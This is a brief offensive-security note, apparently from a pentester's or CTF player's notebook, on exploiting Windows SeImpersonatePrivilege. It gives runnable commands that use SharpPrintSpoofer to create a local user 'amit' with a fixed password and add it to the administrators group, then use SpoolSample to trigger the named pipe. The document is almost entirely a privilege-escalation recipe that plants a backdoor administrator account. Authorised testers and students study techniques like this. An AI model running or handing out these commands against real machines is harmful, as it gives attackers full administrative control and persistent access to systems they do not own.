# Leveraging SeImpersonatePrivilege
- We can exploit it using the two tools: `SpoolSample.exe` and `SharpPrintSpoofer.exe`.
- My recommendation will be just to create a new local administrator: 
```
.\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss "net user amit Password123! /add"
.\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss "net localgroup administrators amit /add"
```

Once SharpPrintSpoofer is listening, trigger the pipe with SpoolSample:
- `.\SpoolSample.exe <hostname> <hostname>/pipe/test`
